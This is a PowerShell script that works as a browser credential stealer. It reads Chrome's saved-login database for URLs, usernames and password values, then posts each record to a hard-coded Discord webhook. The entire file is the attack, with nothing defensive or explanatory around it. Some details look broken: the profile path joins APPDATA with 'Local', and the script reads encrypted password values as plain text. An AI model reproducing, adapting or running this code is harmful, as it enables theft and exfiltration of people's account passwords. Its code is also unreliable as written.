# Define the path to the Chrome login data file
$chromeDataFile = "$env:APPDATA\Local\Google\Chrome\User Data\Default\Login Data"

# Define the SQL query to extract the login data
$chromeQuery = @"
SELECT action_url, username_value, password_value
FROM logins
"@

# Define the Discord webhook URL
$webhookUrl = "https://discordapp.com/api/webhooks/1271517665332035584/e7Vf3prmpK42ZsCn8uT3AcbeBwzoSH500vJNTbnULsrRr1ktFj_0E518oW2k0CKgZvf"

# Define a function to extract the login data from the Chrome database
function Get-ChromeLogins {
  $connectionString = "Data Source=$chromeDataFile;Version=3;"
  $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
  $connection.Open()
  $command = New-Object System.Data.SQLite.SQLiteCommand($chromeQuery, $connection)
  $reader = $command.ExecuteReader()
  $logins = @()
  while ($reader.Read()) {
    $login = New-Object PSObject
    $login | Add-Member -MemberType NoteProperty -Name "URL" -Value $reader.GetString(0)
    $login | Add-Member -MemberType NoteProperty -Name "Username" -Value $reader.GetString(1)
    $login | Add-Member -MemberType NoteProperty -Name "Password" -Value $reader.GetString(2)
    $logins += $login
  }
  $connection.Close()
  return $logins
}

# Define a function to send the data to the Discord webhook
function Send-LoginsToWebhook {
  param([Parameter(Mandatory=$true)] $logins)
  foreach ($login in $logins) {
    $body = @{
      "content" = ("URL: " + $login.URL + "`nUsername: " + $login.Username + "`nPassword: " + $login.Password)
    }
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json"
  }
}

# Extract the login data from the Chrome database
$chromeLogins = Get-ChromeLogins

# Send the login data to the Discord webhook
Send-LoginsToWebhook -Logins $chromeLogins
